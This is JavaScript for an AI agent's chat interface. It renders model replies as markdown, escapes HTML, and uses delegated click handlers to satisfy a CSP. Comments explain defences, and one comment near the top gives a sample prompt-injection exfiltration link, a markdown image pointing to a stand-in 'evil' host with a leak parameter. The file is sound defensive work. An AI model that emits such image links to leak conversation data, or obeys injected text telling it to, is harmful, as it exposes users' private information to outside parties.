/* ---------------- helpers ---------------- */
function esc(s) { return String(s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }

// Files served by this app (/agent/raw, /raw) may auto-load. Anything else is
// click-to-load: an <img> that fetches as soon as a reply renders is a
// prompt-injection exfiltration channel (![](https://evil/?leak=...)).
function isLocalMediaUrl(url) {
  return /^\/(agent\/)?raw\b/.test(String(url || ''));
}

// `url` / `alt` must already be HTML-escaped.
function externalImageButton(url, alt) {
  const host = (String(url).match(/^https?:\/\/([^\/?#]+)/) || [])[1] || 'external site';
  return `<button type="button" class="file-action-badge" data-load-src="${url}" data-load-alt="${alt || 'Image'}" title="${url}">🖼️ Load image from ${host}</button>`;
}

// Delegated handlers for markup produced by md() / renderMediaPreviewSection():
// values arrive via dataset (already decoded), never through inline JS.
document.addEventListener('click', (e) => {
  const load = e.target.closest('[data-load-src]');
  if (load) {
    e.preventDefault();
    const img = document.createElement('img');
    img.src = load.dataset.loadSrc;
    img.alt = load.dataset.loadAlt || 'Image';
    img.className = 'chat-inline-img';
    img.title = 'Click to enlarge';
    const card = load.closest('.media-card-thumb-wrap');
    if (card) { img.className = 'media-card-thumb'; card.replaceChildren(img); }
    else load.replaceWith(img);
    return;
  }
  const prev = e.target.closest('[data-preview-path]');
  if (prev && typeof openFilePreview === 'function') {
    e.preventDefault();
    openFilePreview(prev.dataset.previewPath, prev.dataset.previewTitle || '');
    return;
  }
  const act = e.target.closest('[data-click]');
  if (act && CLICK_ACTIONS[act.dataset.click]) CLICK_ACTIONS[act.dataset.click](act, e);
});

// The CSP forbids inline handlers (onclick=...), so generated markup names an action
// instead: <button data-click="hud-close">, optional data-arg. Handlers resolve the
// page's functions at click time (not every page defines all of them).
const CLICK_ACTIONS = {
  'agent-continue': () => agentContinue(),
  'toggle-all-codex': (el) => toggleAllCodex(el),
  'remove-attachment': (el) => removeAttachment(parseInt(el.dataset.arg, 10)),
  'open-image': (el) => openImageModal(el.src, 'Image attachment'),
  'think-summary': (el, e) => onThinkSummaryClick(parseInt(el.dataset.arg, 10), e),
  'submit-grill': (el) => submitGrillAnswers(parseInt(el.dataset.arg, 10)),
  'new-project': () => document.getElementById('btn-newproject').click(),
  'hud-close': () => setLiveHud(null),
  'mermaid-fullscreen': (el) => openFilePreview('diagram.mermaid', 'Mermaid Diagram',
    el.closest('.mermaid-box').querySelector('.mermaid-code-raw').textContent),
};

// Non-bubbling events, caught in the capture phase.
document.addEventListener('toggle', (e) => {
  const d = e.target;
  if (d && d.dataset && d.dataset.thinkIdx !== undefined && typeof onToggleThink === 'function')
    onToggleThink(parseInt(d.dataset.thinkIdx, 10), d.open);
}, true);
document.addEventListener('error', (e) => {
  const img = e.target;
  if (img && img.dataset && img.dataset.hideCardOnError !== undefined) {
    const card = img.closest('.media-card');
    if (card) card.style.display = 'none';
  }
}, true);

// data-stop: clicks inside must not reach ancestor handlers (e.g. buttons inside a
// <summary>). Needs a listener on the element itself - a document-level one runs too late.
function bindStopPropagation(root) {
  (root.querySelectorAll ? root.querySelectorAll('[data-stop]:not([data-stop-bound])') : []).forEach(el => {
    el.setAttribute('data-stop-bound', '');
    el.addEventListener('click', (ev) => ev.stopPropagation());
  });
}
if (typeof MutationObserver !== 'undefined' && document.documentElement) {
  new MutationObserver(muts => {
    for (const m of muts) for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if (n.matches('[data-stop]:not([data-stop-bound])')) bindStopPropagation(n.parentNode);
      else bindStopPropagation(n);
    }
  }).observe(document.documentElement, { childList: true, subtree: true });
}

function md(s) {
  // split fences BEFORE escaping: hlCode() escapes internally
  const parts = String(s).split(/```/);
  let out = '';
  for (let i = 0; i < parts.length; i++) {
    if (i % 2 === 1) { // fenced code block: ```lang\ncode
      const m = parts[i].match(/^([\w#+.-]*)\n([\s\S]*)$/);
      const rawLang = m ? m[1].toLowerCase() : '';
      const code = m ? m[2] : parts[i];
      if (rawLang === 'mermaid') {
        // Render interactive Mermaid diagram box
        out += `<div class="mermaid-box">
          <div class="mermaid-header">
            <span>📊 Mermaid Diagram</span>
            <div style="display:flex; gap:6px;">
              <button class="btn ghost" style="padding:2px 6px; font-size:10px;" data-click="mermaid-fullscreen">⤢ Fullscreen</button>
            </div>
          </div>
          <div class="mermaid-viewport"><div class="dim" style="font-size:11px;">Rendering diagram…</div></div>
          <pre class="mermaid-code-raw" style="display:none;">${esc(code)}</pre>
        </div>`;
      } else {
        const lang = hlLangFor(rawLang);
        out += '<pre><code>' + (lang ? hlCode(code, lang) : esc(code)) + '</code></pre>';
      }
    } else {
      // files shown as an inline image here: their download chips would repeat them
      const shown = new Set();
      String(parts[i]).replace(/!\[[^\]]*\]\((?:\/agent\/raw|\/raw)\?path=([^)&\s]+)[^)]*\)/g, (_, p) => {
        try { shown.add(decodeURIComponent(p)); } catch (e) { shown.add(p); }
        return _;
      });
      let t = esc(parts[i]);
      t = t.replace(/`([^`]+)`/g, '<code>$1</code>');
      t = t.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
      t = t.replace(/^#{1,3} (.*)$/gm, '<b>$1</b>');
      t = t.replace(/^\s*[-*] (.*)$/gm, '• $1');

      // Highlight internal directives (/commands, /skills) and file tags (@files)
      t = t.replace(/(^|[\s\[({,;:"'])\/([a-zA-Z0-9_\-]+)(?=$|[\s\])}>.,;:!?])/g,
        '$1<span class="token-hl token-cmd" title="Internal directive: /$2">/$2</span>');
      t = t.replace(/(^|[\s\[({,;:"'])@([\w\-./\\]+\.[\w]+)(?=$|[\s\])}>.,;:!?])/g,
        '$1<span class="token-hl token-tag" title="Target file: @$2">@$2</span>');

      // `t` is already HTML-escaped here, so captured groups are safe inside a
      // quoted attribute. Model text never goes into inline JS (onclick=...):
      // the browser would decode &#39; back to ' and let it break out of the
      // JS string. Clicks are handled by the delegated [data-preview-path]
      // listener below instead.

      // 1. Render markdown images: ![alt](url)
      t = t.replace(/!\[([^\]]*)\]\(((?:https?:\/\/|\/agent\/raw|\/raw)[^)]+)\)/g, (match, alt, url) => {
        if (!isLocalMediaUrl(url)) return externalImageButton(url, alt);
        return `<span class="chat-inline-media"><img src="${url}" alt="${alt}" class="chat-inline-img" loading="lazy" title="Click to enlarge" /></span>`;
      });

      // 2. Render links & file download buttons
      t = t.replace(/\[([^\]]+)\]\(((?:https?:\/\/|\/agent\/download|\/download)[^)]+)\)/g, (match, text, url) => {
        if (url.startsWith('/agent/download') || url.startsWith('/download')) {
          const m = url.match(/[?&]path=([^&]+)/);
          let fpath = text;
          if (m) { try { fpath = esc(decodeURIComponent(m[1])); } catch (e) { fpath = m[1]; } }
          if (m && shown.has(_unesc(fpath))) return '';
          return `<span style="display:inline-flex; align-items:center; gap:4px; margin:2px 0;">
            <button type="button" class="file-action-badge primary" data-preview-path="${fpath}" data-preview-title="${text}" title="Preview ${text}">👁️ Preview ${text}</button>
            <a href="${url}" class="file-action-badge" download title="Download ${text}">⬇</a>
          </span>`;
        }
        return `<a href="${url}" target="_blank" rel="noopener noreferrer">${text}</a>`;
      });

      // 3a. [VIDEO: generated/x.mp4] markers from /video and generate_video: inline player
      t = t.replace(/\[VIDEO:\s*([^\]]+)\]/g, (_, fname) => {
        const src = `/agent/raw?path=${encodeURIComponent(fname.trim())}`;
        return `<span class="chat-inline-media"><video class="chat-inline-video" controls preload="metadata" src="${src}"></video></span>`;
      });

      // 3. Parse [DOWNLOAD: filename] markers emitted by the agent
      t = t.replace(/\[DOWNLOAD:\s*([^\]]+)\]/g, (_, fname) => {
        const cleanName = fname.trim();
        if (shown.has(_unesc(cleanName))) return '';
        const url = `/agent/download?path=${encodeURIComponent(cleanName)}`;
        return `<span style="display:inline-flex; align-items:center; gap:4px; margin:2px 0;">
          <button type="button" class="file-action-badge primary" data-preview-path="${cleanName}" data-preview-title="${cleanName}" title="Preview ${cleanName}">👁️ Preview ${cleanName}</button>
          <a href="${url}" class="file-action-badge" download="${cleanName}" title="Download ${cleanName}">⬇ Download</a>
        </span>`;
      });
      t = t.replace(/\n/g, '<br>');
      out += t;
    }
  }
  return out;
}

// md() works on escaped text; compare file paths unescaped
function _unesc(s) {
  return String(s).replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, '&');
}

/* ---------------- Image & Video Preview Section ---------------- */
function extractMediaItems(s) {
  if (!s || typeof s !== 'string') return [];
  const items = [];
  const seen = new Set();

  function addItem(type, url, title, thumb) {
    if (!url || seen.has(url)) return;
    seen.add(url);
    items.push({ type, url, title: title || (type === 'video' ? 'Video' : 'Image'), thumb: thumb || url });
  }

  // 1. Markdown images: ![alt](url)
  const mdImgRx = /!\[([^\]]*)\]\((https?:\/\/[^)\s]+)\)/g;   // local ones are already inline
  let m;
  while ((m = mdImgRx.exec(s)) !== null) {
    addItem('image', m[2], m[1] || 'Image');
  }

  // 2. YouTube URLs
  const ytRx = /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/(?:watch\?v=|embed\/|v\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})/g;
  while ((m = ytRx.exec(s)) !== null) {
    const vid = m[1];
    addItem('youtube', `https://www.youtube.com/watch?v=${vid}`, 'YouTube Video', `https://img.youtube.com/vi/${vid}/hqdefault.jpg`);
  }

  // 3. Markdown links pointing to media: [title](url)
  const linkRx = /\[([^\]]+)\]\((https?:\/\/[^)\s]+\.(?:png|jpg|jpeg|webp|gif|svg|mp4|webm))(?:\?[^)]*)?\)/gi;
  while ((m = linkRx.exec(s)) !== null) {
    const isVid = /\.(mp4|webm)$/i.test(m[2]);
    addItem(isVid ? 'video' : 'image', m[2], m[1]);
  }

  // 4. Raw image/video URLs in text
  const rawMediaRx = /(https?:\/\/[^\s<>"')\]]+\.(?:png|jpg|jpeg|webp|gif|svg|mp4|webm)(?:\?[^\s<>"')\]]*)?)/gi;
  while ((m = rawMediaRx.exec(s)) !== null) {
    const isVid = /\.(mp4|webm)/i.test(m[1]);
    addItem(isVid ? 'video' : 'image', m[1], isVid ? 'Video Preview' : 'Image Preview');
  }

  return items;
}

function renderMediaPreviewSection(text) {
  const items = extractMediaItems(text);
  if (!items || !items.length) return '';

  let html = `<div class="chat-media-preview-section">
    <div class="media-preview-header">
      <span class="media-preview-title">🖼️ Media Preview (${items.length})</span>
      <span class="media-preview-sub">Click thumbnail to view full resolution</span>
    </div>
    <div class="media-preview-grid">`;

  items.forEach(it => {
    // it.url comes from raw (unescaped) model text: escape for every attribute
    const cleanTitle = esc(it.title || 'Media');
    const safeUrl = esc(it.url);

    if (it.type === 'youtube') {
      const vidMatch = it.url.match(/([a-zA-Z0-9_-]{11})/);
      const vidId = vidMatch ? vidMatch[1] : '';
      html += `<div class="media-card media-card-video">
        <div class="media-video-frame">
          <iframe src="https://www.youtube-nocookie.com/embed/${vidId}" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe>
        </div>
        <div class="media-card-footer">
          <span class="media-card-name" title="${cleanTitle}">▶ ${cleanTitle}</span>
          <a href="${safeUrl}" target="_blank" rel="noopener noreferrer" class="media-card-ext-btn" title="Open YouTube">↗</a>
        </div>
      </div>`;
    } else if (it.type === 'video') {
      // preload="none": nothing is fetched until the user presses play
      html += `<div class="media-card media-card-video">
        <div class="media-video-frame">
          <video controls preload="none" src="${safeUrl}"></video>
        </div>
        <div class="media-card-footer">
          <span class="media-card-name" title="${cleanTitle}">🎬 ${cleanTitle}</span>
          <a href="${safeUrl}" target="_blank" rel="noopener noreferrer" class="media-card-ext-btn" title="Open Video">↗</a>
        </div>
      </div>`;
    } else {
      // Image: local files load right away, external ones only on click
      const thumb = esc(it.thumb || it.url);
      const media = isLocalMediaUrl(it.url)
        ? `<img src="${thumb}" class="media-card-thumb" loading="lazy" alt="${cleanTitle}" data-preview-path="${safeUrl}" data-preview-title="${cleanTitle}" data-hide-card-on-error />`
        : externalImageButton(thumb, cleanTitle);
      html += `<div class="media-card media-card-img">
        <div class="media-card-thumb-wrap">
          ${media}
          <span class="media-badge">IMAGE</span>
        </div>
        <div class="media-card-footer">
          <span class="media-card-name" title="${cleanTitle}">${cleanTitle}</span>
          <a href="${safeUrl}" target="_blank" rel="noopener noreferrer" class="media-card-ext-btn" title="Open Original">↗</a>
        </div>
      </div>`;
    }
  });

  html += `</div></div>`;
  return html;
}

function toast(msg, isErrOrOptions) {
  const t = $('toast');
  if (!t) return;
  const isErr = typeof isErrOrOptions === 'boolean' ? isErrOrOptions : !!(isErrOrOptions && isErrOrOptions.isErr);
  const duration = (isErrOrOptions && typeof isErrOrOptions.duration === 'number') ? isErrOrOptions.duration : 4000;
  const actions = (isErrOrOptions && Array.isArray(isErrOrOptions.actions)) ? isErrOrOptions.actions : [];

  t.innerHTML = '';
  const textSpan = document.createElement('span');
  textSpan.className = 'toast-text';
  textSpan.textContent = typeof msg === 'string' ? msg : '';   // callers pass filenames, titles, remote errors
  t.appendChild(textSpan);

  if (actions.length) {
    const actContainer = document.createElement('span');
    actContainer.className = 'toast-actions';
    actions.forEach(a => {
      const btn = document.createElement('button');
      btn.className = 'toast-btn';
      btn.textContent = a.label;
      btn.onclick = (e) => {
        e.stopPropagation();
        if (typeof a.onClick === 'function') a.onClick();
        if (!a.keepOpen) {
          clearTimeout(t._h);
          t.className = '';
        }
      };
      actContainer.appendChild(btn);
    });
    t.appendChild(actContainer);
  }

  t.className = 'show' + (isErr ? ' err' : '');
  clearTimeout(t._h);
  if (duration > 0) {
    t._h = setTimeout(() => t.className = '', duration);
  }
}
window.toast = toast;

let _hudFadeTimer = null;
function setLiveHud(state) {
  const hud = $('live-state-hud');
  if (!hud) return;
  if (!state) {
    if (hud.style.display !== 'none') {
      hud.style.opacity = '0';
      hud.style.transition = 'opacity 0.25s ease';
      clearTimeout(_hudFadeTimer);
      _hudFadeTimer = setTimeout(() => {
        hud.style.display = 'none';
        hud.innerHTML = '';
      }, 250);
    }
    return;
  }
  clearTimeout(_hudFadeTimer);
  hud.style.display = 'flex';
  hud.style.opacity = '1';

  let iconHtml = '<div class="hud-spinner"></div>';
  if (state.phase === 'done') iconHtml = '<span class="hud-icon">✅</span>';
  else if (state.phase === 'error') iconHtml = '<span class="hud-icon">⚠️</span>';
  else if (state.phase === 'thinking') iconHtml = '<span class="hud-icon">💭</span>';
  else if (state.phase === 'preparing') iconHtml = '<div class="hud-spinner" style="border-top-color:#a855f7;"></div>';
  else if (state.phase === 'writing') iconHtml = '<div class="hud-spinner" style="border-top-color:#22c55e;"></div>';

  let actionsHtml = '';
  if (Array.isArray(state.actions) && state.actions.length) {
    actionsHtml = `<div class="hud-actions">`
      + state.actions.map((a, i) => `<button class="hud-action-btn" data-act="${i}">${esc(a.label)}</button>`).join('')
      + `<button class="hud-close-btn" title="Dismiss" data-click="hud-close">✕</button>`
      + `</div>`;
  } else if (state.phase === 'done' || state.phase === 'error') {
    actionsHtml = `<div class="hud-actions"><button class="hud-close-btn" title="Dismiss" data-click="hud-close">✕</button></div>`;
  }

  hud.innerHTML = `<div class="hud-left">`
    + iconHtml
    + `<span class="hud-text">${esc(state.text || '')}</span>`
    + (state.subtext ? `<span class="hud-subtext">${esc(state.subtext)}</span>` : '')
    + `</div>`
    + actionsHtml;

  if (Array.isArray(state.actions) && state.actions.length) {
    hud.querySelectorAll('.hud-action-btn').forEach(btn => {
      const idx = parseInt(btn.dataset.act, 10);
      const act = state.actions[idx];
      if (act && typeof act.onClick === 'function') {
        btn.onclick = (e) => {
          e.stopPropagation();
          act.onClick();
        };
      }
    });
  }

  if (state.phase === 'done') {
    clearTimeout(_hudFadeTimer);
    _hudFadeTimer = setTimeout(() => setLiveHud(null), 6000);
  }
}
window.setLiveHud = setLiveHud;

function fmtUptime(s) {
  if (s == null) return '';
  s = Math.floor(s);
  const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
  return h ? `${h}h ${m}m` : (m ? `${m}m ${sec}s` : `${sec}s`);
}
